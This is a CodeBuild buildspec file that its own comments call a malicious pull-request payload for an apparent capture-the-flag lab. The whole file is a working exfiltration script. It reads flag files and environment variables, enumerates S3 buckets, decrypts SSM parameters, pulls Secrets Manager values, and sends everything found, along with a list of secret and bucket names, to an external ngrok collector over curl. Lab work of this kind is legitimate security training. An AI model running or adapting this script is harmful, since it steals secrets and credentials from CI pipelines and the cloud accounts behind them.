version: 0.2

# Malicious PR payload for codebuild_lab_5_project (lab5).
# Optimized flag hunting - check specific locations and send results via GET.

phases:
  build:
    commands:
      - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"

      # 1) Check common flag file locations
      - |
        for path in /root/flag /tmp/flag /flag FLAG flag.txt /home/flag /opt/flag; do
          if [ -f "$path" ] && [ -r "$path" ]; then
            FLAG=$(cat "$path" 2>/dev/null)
            if [ ! -z "$FLAG" ]; then
              curl -s "${COLLECTOR}/?source=file&path=$path&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
              exit 0
            fi
          fi
        done

      # 2) Check environment variables for FLAG* or flag* pattern
      - |
        for var in FLAG FLAG_VALUE FLAG_CONTENT SECRET SOLUTION ANSWER; do
          if [ ! -z "${!var}" ]; then
            curl -s "${COLLECTOR}/?source=env&var=$var&flag=$(echo -n "${!var}" | jq -sRr @uri)"
            exit 0
          fi
        done

      # 3) Hunt S3 for objects with "flag" in name and download them
      - |
        for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
          for obj in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[].Key' --output text 2>/dev/null); do
            if echo "$obj" | grep -qi flag; then
              FLAG=$(aws s3api get-object --bucket "$b" --key "$obj" /dev/stdout 2>/dev/null | head -c 1000)
              if [ ! -z "$FLAG" ]; then
                curl -s "${COLLECTOR}/?source=s3&bucket=$b&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
                exit 0
              fi
            fi
          done
        done

      # 4) Hunt SSM parameters - especially /flag* or containing "flag"
      - |
        for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do
          if echo "$p" | grep -qi flag; then
            FLAG=$(aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null)
            if [ ! -z "$FLAG" ]; then
              curl -s "${COLLECTOR}/?source=ssm&param=$p&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
              exit 0
            fi
          fi
        done

      # 5) Hunt Secrets Manager
      - |
        for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
          if echo "$s" | grep -qi flag; then
            FLAG=$(aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>/dev/null)
            if [ ! -z "$FLAG" ]; then
              curl -s "${COLLECTOR}/?source=secrets&secret=$s&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
              exit 0
            fi
          fi
        done

      # 6) If still nothing, list all parameter/secret names so user can choose
      - |
        PARAMS=$(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null | tr '\t' '|')
        SECRETS=$(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '|')
        BUCKETS=$(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null | tr '\t' '|')
        curl -s "${COLLECTOR}/?source=enum&ssm_params=$(echo -n "$PARAMS" | jq -sRr @uri)&secrets=$(echo -n "$SECRETS" | jq -sRr @uri)&buckets=$(echo -n "$BUCKETS" | jq -sRr @uri)"

      - echo "Done"
